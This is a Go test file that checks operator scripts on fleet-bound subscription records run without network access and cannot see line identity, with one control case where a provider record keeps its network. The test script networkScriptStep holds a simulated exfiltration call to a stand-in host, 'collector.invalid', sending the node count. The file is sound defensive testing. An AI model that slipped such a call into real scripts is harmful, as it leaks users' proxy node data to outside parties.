package main

import (
	"encoding/json"
	"fmt"
	"strings"
	"testing"

	"github.com/LatticeNet/lattice-sdk/model"
	latticeplugin "github.com/LatticeNet/lattice-sdk/plugin"
)

// S2-SR-2: a script on a fleet-bound record runs with no network and sees no
// line identity. The grant is per method, and render carries it, so before
// this a Script Operator on a fleet record reached the network with every
// node and its Lattice block in hand.

// networkScriptStep is a Script Operator that asks for the network and
// swallows the refusal, the way a script author's own error handling would,
// then returns the nodes untouched.
func networkScriptStep(t *testing.T) json.RawMessage {
	t.Helper()
	return auditScriptOperator(t, `async function operator(proxies) {
		try {
			await $substore.http.get({ url: "https://collector.invalid/?n=" + proxies.length, timeout: 100 });
		} catch (failure) {}
		return proxies;
	}`)
}

// renderInvocation drives render through serveInvocation, the production
// entry point, so the network grant render carries is attached exactly as in
// production.
func renderInvocation(t *testing.T, rt *runtime, payload map[string]any) response {
	t.Helper()
	raw, err := json.Marshal(payload)
	if err != nil {
		t.Fatal(err)
	}
	return serveInvocation(rt.engine, rt.host, request{
		Action: latticeplugin.ActionCall, Service: pluginID + "/subscription", Method: "render", Payload: raw,
	})
}

// requireNetworkRefused asserts a call failed with the typed refusal, leading
// its message, and sent nothing.
func requireNetworkRefused(t *testing.T, res response, host *fleetCatalogueHost, before int) {
	t.Helper()
	if sent := host.httpCalls - before; sent != 0 {
		t.Fatalf("a script on a fleet-bound record sent %d request(s) over the network", sent)
	}
	if res.OK || !strings.HasPrefix(res.Error, codeFleetScriptNetworkUnavailable+":") {
		t.Fatalf("the call did not refuse the script's network: ok=%v error=%q", res.OK, res.Error)
	}
}

// TestFleetRenderSendsNoScriptRequest: a served fleet record whose chain asks
// for the network sends no request through the host, and the render fails
// with fleet_script_network_unavailable although the script caught the
// refusal.
func TestFleetRenderSendsNoScriptRequest(t *testing.T) {
	freshFleetPlans(t)
	rt, host := newFleetRuntime(t, fleetTestRows(3, "vless"))
	saveFleetRecord(t, rt, subscriptionRecord{ID: "scripted", Process: []json.RawMessage{networkScriptStep(t)}})
	fetched, err := rt.fetchSubscription("scripted")
	if err != nil {
		t.Fatal(err)
	}
	before := host.httpCalls
	res := renderInvocation(t, rt, map[string]any{"subscription_id": "scripted", "raw": fetched.Raw, "target": "sing-box"})
	requireNetworkRefused(t, res, host, before)
	if !strings.Contains(res.Error, `subscription "scripted"`) {
		t.Fatalf("the refusal does not name the record: %q", res.Error)
	}
}

// TestFleetStagedRenderSendsNoScriptRequest: core's preview of a staged
// revision for a plan, which runs before anyone approved it, is withheld the
// same way.
func TestFleetStagedRenderSendsNoScriptRequest(t *testing.T) {
	freshFleetPlans(t)
	rt, host := newFleetRuntime(t, fleetTestRows(3, "vless"))
	seedFleetLive(t, rt, subscriptionRecord{ID: "f", Name: "f", Source: subscriptionSourceFleet})
	staged := stageRecord(t, rt, subscriptionRecord{ID: "f", Source: subscriptionSourceFleet, Process: []json.RawMessage{networkScriptStep(t)}})
	before := host.httpCalls
	res := renderInvocation(t, rt, map[string]any{"subscription_id": "f", "target": "sing-box", "revision": staged})
	requireNetworkRefused(t, res, host, before)
}

// TestFleetCollectionRenderSendsNoScriptRequest: a fleet-bound collection's
// own chain runs over its fleet and provider nodes with no network.
func TestFleetCollectionRenderSendsNoScriptRequest(t *testing.T) {
	freshFleetPlans(t)
	rt, host := newFleetRuntime(t, mixedProtocolRows())
	saveFleetRecord(t, rt, subscriptionRecord{ID: "f"})
	if err := rt.saveSubscription(subscriptionRecord{ID: "p", Name: "p", Source: subscriptionSourceLocal, Content: "trojan://pw1@198.51.100.7:443#provider-one"}); err != nil {
		t.Fatal(err)
	}
	if err := rt.saveSubscription(subscriptionRecord{ID: "c", Name: "c", Kind: kindCollection, Members: []string{"f", "p"}, Process: []json.RawMessage{networkScriptStep(t)}}); err != nil {
		t.Fatal(err)
	}
	fetched, err := rt.fetchSubscription("c")
	if err != nil {
		t.Fatal(err)
	}
	before := host.httpCalls
	res := renderInvocation(t, rt, map[string]any{"subscription_id": "c", "raw": fetched.Raw, "target": "sing-box"})
	requireNetworkRefused(t, res, host, before)
	if !strings.Contains(res.Error, `collection "c"`) {
		t.Fatalf("the refusal does not name the collection: %q", res.Error)
	}
}

// TestFleetCollectionProviderMemberChainSendsNoScriptRequest: in a render of
// a fleet-bound collection, a provider member's own chain is withheld too,
// although it sees only the provider's nodes: the whole render runs without
// a network, as fetch already does.
func TestFleetCollectionProviderMemberChainSendsNoScriptRequest(t *testing.T) {
	freshFleetPlans(t)
	rt, host := newFleetRuntime(t, mixedProtocolRows())
	saveFleetRecord(t, rt, subscriptionRecord{ID: "f"})
	if err := rt.saveSubscription(subscriptionRecord{ID: "p", Name: "p", Source: subscriptionSourceLocal, Content: "trojan://pw1@198.51.100.7:443#provider-one"}); err != nil {
		t.Fatal(err)
	}
	seedFleetLive(t, rt, subscriptionRecord{ID: "c", Name: "c", Kind: kindCollection, Members: []string{"f", "p"}})
	c, _ := entryOf(t, rt, "c")
	// p is gathered by a fleet-bound collection, so its edit stages
	// (S2-SR-1); core previews c with p at the staged revision.
	pStaged := stageRecord(t, rt, subscriptionRecord{ID: "p", Source: subscriptionSourceLocal, Content: "trojan://pw1@198.51.100.7:443#provider-one", Process: []json.RawMessage{networkScriptStep(t)}})
	f, _ := entryOf(t, rt, "f")
	before := host.httpCalls
	res := renderInvocation(t, rt, map[string]any{"subscription_id": "c", "target": "sing-box", "revision": c.Revision,
		"member_revisions": map[string]string{"f": f.Revision, "p": pStaged}})
	requireNetworkRefused(t, res, host, before)
}

// TestFleetPreviewNamesTheScriptNetworkRefusal: the editor's preview of a
// fleet record runs the same chain and shows the same typed refusal, so the
// author learns it before a plan does.
func TestFleetPreviewNamesTheScriptNetworkRefusal(t *testing.T) {
	rt, host := newFleetRuntime(t, fleetTestRows(2, "vless"))
	saveFleetRecord(t, rt, subscriptionRecord{ID: "scripted", Process: []json.RawMessage{networkScriptStep(t)}})
	before := host.httpCalls
	for _, method := range []string{"preview", "preview_draft"} {
		res := callSubscription(t, rt, method, map[string]any{"subscription_id": "scripted", "target": "URI"})
		requireNetworkRefused(t, res, host, before)
	}
}

// TestProcessNodesWithholdsTheNetworkOnItsOwn: processNodes, which only fleet
// chains call, withholds the network even under an invocation that attached
// one and outside any render wrapper.
func TestProcessNodesWithholdsTheNetworkOnItsOwn(t *testing.T) {
	recording := &scriptHTTPHost{body: []byte("ok")}
	engine := newTestEmbeddedSubStoreEngine()
	defer engine.attachScriptHTTP(newScriptHTTPGateway(recording))()
	nodes, _, err := fleetRowNodes(projectRows(fleetTestRows(2, "vless")), nil, newFleetPlaceholders(2))
	if err != nil {
		t.Fatal(err)
	}
	_, err = engine.processNodes(nodes, []json.RawMessage{networkScriptStep(t)}, "sing-box")
	if err == nil || !strings.HasPrefix(err.Error(), codeFleetScriptNetworkUnavailable+":") {
		t.Fatalf("processNodes = %v, want %s", err, codeFleetScriptNetworkUnavailable)
	}
	if seen := recording.seen(); len(seen) != 0 {
		t.Fatalf("processNodes let a script reach the network: %+v", seen)
	}
	// The invocation's gateway is back once processNodes returns.
	if engine.scriptHTTP.Load() == nil || engine.scriptHTTP.Load().withheld {
		t.Fatal("processNodes did not restore the invocation's network")
	}
}

// TestProviderRenderKeepsTheScriptNetwork is the control: a render that
// reaches no fleet node keeps the network render is granted.
func TestProviderRenderKeepsTheScriptNetwork(t *testing.T) {
	rt, host := newFleetRuntime(t, nil)
	host.httpBody = "ok"
	if err := rt.saveSubscription(subscriptionRecord{ID: "p", Name: "p", Source: subscriptionSourceLocal,
		Content: "trojan://pw1@198.51.100.7:443#provider-one", Process: []json.RawMessage{networkScriptStep(t)}}); err != nil {
		t.Fatal(err)
	}
	before := host.httpCalls
	res := renderInvocation(t, rt, map[string]any{"subscription_id": "p", "target": "URI", "format": "plain"})
	if !res.OK {
		t.Fatalf("provider render: %s", res.Error)
	}
	if sent := host.httpCalls - before; sent != 1 {
		t.Fatalf("a provider record's script sent %d requests, want 1", sent)
	}
}

// TestFleetScriptSeesNoLineIdentity: the nodes a script receives on a
// fleet-bound record carry no Lattice block, no placeholder and no line
// identifier or address from the row, on every protocol core binds, and the
// plan still binds every node to its line, because the block and the
// placeholders are put back outside the script.
func TestFleetScriptSeesNoLineIdentity(t *testing.T) {
	freshFleetPlans(t)
	var rows []model.LineCatalogueRow
	for i, protocol := range []string{"vless", "trojan", "anytls", "hysteria2", "tuic", "vmess", "socks"} {
		rows = append(rows, fleetTestRow(i+1, protocol))
	}
	var identifiers []string
	for _, row := range rows {
		identifiers = append(identifiers, row.LineUUID, row.LineHashID, row.NodeID, row.Addresses[0])
	}
	known, _ := json.Marshal(identifiers)
	inspect := auditScriptOperator(t, fmt.Sprintf(`function operator(proxies) {
		const identifiers = %s;
		return proxies.map((proxy) => {
			const seen = JSON.stringify(proxy);
			const leaked = ("_lattice" in proxy) || seen.indexOf("LATTICE-SYN-") >= 0 ||
				identifiers.some((id) => seen.indexOf(id) >= 0);
			return Object.assign({}, proxy, { name: (leaked ? "leaked " : "clean ") + proxy.name });
		});
	}`, known))
	rt, host := newFleetRuntime(t, rows)
	saveFleetRecord(t, rt, subscriptionRecord{ID: "inspected", Process: []json.RawMessage{inspect}})
	fetched, err := rt.fetchSubscription("inspected")
	if err != nil {
		t.Fatal(err)
	}
	before := host.httpCalls
	res := renderInvocation(t, rt, map[string]any{"subscription_id": "inspected", "raw": fetched.Raw, "target": "sing-box"})
	if !res.OK {
		t.Fatalf("render: %s", res.Error)
	}
	var out renderReply
	if err := json.Unmarshal(res.Result, &out); err != nil {
		t.Fatal(err)
	}
	plan := decodeRenderPlan(t, out.Plan)
	names := planNames(t, plan)
	if len(names) != len(rows) {
		t.Fatalf("plan names = %v", names)
	}
	for _, name := range names {
		if !strings.HasPrefix(name, "clean ") {
			t.Fatalf("a script on a fleet-bound record saw line identity: node named %q", name)
		}
	}
	lines := planLines(plan)
	if len(lines) != len(rows) {
		t.Fatalf("the plan binds %d of %d nodes to a line: %v", len(lines), len(rows), lines)
	}
	for i, node := range plan.Nodes {
		if len(node.Placeholders) == 0 {
			t.Fatalf("node %d carries no placeholder: %+v", i, node)
		}
		for field, placeholder := range node.Placeholders {
			if !strings.Contains(string(node.Node), placeholder) {
				t.Fatalf("node %d lost its %s placeholder: %s", i, field, node.Node)
			}
		}
		if strings.Contains(string(node.Node), fleetMaskTokenPrefix) {
			t.Fatalf("node %d kept a mask token: %s", i, node.Node)
		}
	}
	if host.httpCalls != before {
		t.Fatal("the inspecting render reached the network")
	}
}
